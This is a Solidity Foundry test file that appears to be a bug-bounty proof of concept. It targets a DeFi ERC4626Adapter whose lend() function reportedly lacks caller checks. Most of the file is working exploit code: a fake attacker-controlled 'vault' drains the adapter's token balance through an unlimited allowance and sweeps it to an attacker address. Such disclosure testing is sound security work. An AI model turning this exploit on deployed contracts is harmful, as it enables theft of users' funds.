// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

/*
    PoC F-01 - ERC4626Adapter: lend() / redeem() have no onlyIntegrationManager

    Target (Immunefi scope, "Enzyme Blue"):
      contracts/release/extensions/integration-manager/integrations/adapters/ERC4626Adapter.sol

    What this test proves (no fork required; the adapter is the real production code):

      1. ANY external account can call ERC4626Adapter.lend(...) directly.
      2. lend() calls __approveAssetMaxAsNeeded(), which grants an UNLIMITED
         (type(uint256).max) ERC20 allowance from the adapter to a caller-chosen address.
      3. lend() then performs a caller-chosen external call:
         IERC4626(callerChosenAddress).deposit(amount, callerChosenReceiver).
      4. (2)+(3) => any tokens held by the adapter can be pulled out by an anonymous
         attacker, and the adapter can be used as an arbitrary-call primitive.

    Run:
      forge test --match-path "tests/arena-poc/F01_ERC4626Adapter_NoAuth.t.sol" -vvv
*/

import {Test, console2} from "forge-std/Test.sol";

import {ERC4626Adapter} from "contracts/release/extensions/integration-manager/integrations/adapters/ERC4626Adapter.sol";
import {IERC20} from "contracts/external-interfaces/IERC20.sol";
import {ERC20} from "openzeppelin-solc-0.8/token/ERC20/ERC20.sol";

/// @dev Plain ERC20 used as the "spend asset" (e.g. USDC in production).
contract MockERC20 is ERC20 {
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {}

    function mint(address _to, uint256 _amount) external {
        _mint(_to, _amount);
    }
}

/// @dev Malicious contract that the attacker passes off as an "ERC4626 vault".
/// The adapter approves it for an unlimited amount and then calls deposit() on it.
contract AttackerControlled4626 {
    IERC20 private immutable ASSET;
    address public immutable ADAPTER;

    constructor(IERC20 _asset, address _adapter) {
        ASSET = _asset;
        ADAPTER = _adapter;
    }

    /// @dev Selector matches IERC4626.deposit(uint256 assets, address receiver)
    function deposit(uint256 _assets, address) external returns (uint256) {
        // The adapter granted us max allowance in __approveAssetMaxAsNeeded() -> sweep its balance.
        ASSET.transferFrom(ADAPTER, address(this), _assets);

        return _assets;
    }

    function sweepTo(address _to) external {
        ASSET.transfer(_to, ASSET.balanceOf(address(this)));
    }
}

contract F01_ERC4626Adapter_NoAuth is Test {
    ERC4626Adapter internal adapter;
    MockERC20 internal usdc;
    AttackerControlled4626 internal evilVault;

    address internal constant VICTIM_VAULT_PROXY = address(0xB0B);
    address internal constant ATTACKER = address(0xBAD);

    function setUp() public {
        // Real adapter. The IntegrationManager address is irrelevant here, because the
        // entrypoints never check it.
        adapter = new ERC4626Adapter(address(0x1111));
        usdc = new MockERC20("USD Coin", "USDC");
        evilVault = new AttackerControlled4626(IERC20(address(usdc)), address(adapter));

        // Tokens that exist inside the adapter. In production these appear whenever the
        // IntegrationManager uses SpendAssetsHandleType.Transfer (it moves the spend assets
        // to the adapter *before* calling it) and the adapter does not spend everything.
        usdc.mint(address(adapter), 1_000e18);
    }

    function test_AnyoneCanDrainAdapterAndForceArbitraryCall() public {
        console2.log("=== BEFORE ===");
        console2.log("adapter USDC balance   :", usdc.balanceOf(address(adapter)));
        console2.log("attacker contract USDC :", usdc.balanceOf(address(evilVault)));

        // ABI shape produced by IntegrationManager, but crafted by the attacker.
        address[] memory spendAssets = new address[](1);
        spendAssets[0] = address(usdc);
        uint256[] memory spendAssetAmounts = new uint256[](1);
        spendAssetAmounts[0] = 1_000e18;
        address[] memory incomingAssets = new address[](1);
        incomingAssets[0] = address(evilVault); // attacker-chosen "ERC4626 vault"

        bytes memory assetData = abi.encode(spendAssets, spendAssetAmounts, incomingAssets);

        // msg.sender == ATTACKER, NOT the IntegrationManager.
        vm.prank(ATTACKER);
        adapter.lend(VICTIM_VAULT_PROXY, "", assetData);

        console2.log("=== AFTER ===");
        console2.log("adapter USDC balance   :", usdc.balanceOf(address(adapter)));
        console2.log("attacker contract USDC :", usdc.balanceOf(address(evilVault)));
        console2.log("allowance adapter->attacker:", usdc.allowance(address(adapter), address(evilVault)));

        assertEq(usdc.balanceOf(address(adapter)), 0, "adapter drained");
        assertEq(usdc.balanceOf(address(evilVault)), 1_000e18, "attacker got the funds");
        assertEq(
            usdc.allowance(address(adapter), address(evilVault)),
            type(uint256).max,
            "unlimited allowance granted to attacker contract"
        );

        // Funds are now fully controlled by the attacker.
        evilVault.sweepTo(ATTACKER);
        assertEq(usdc.balanceOf(ATTACKER), 1_000e18, "attacker EOA received the funds");
    }
}
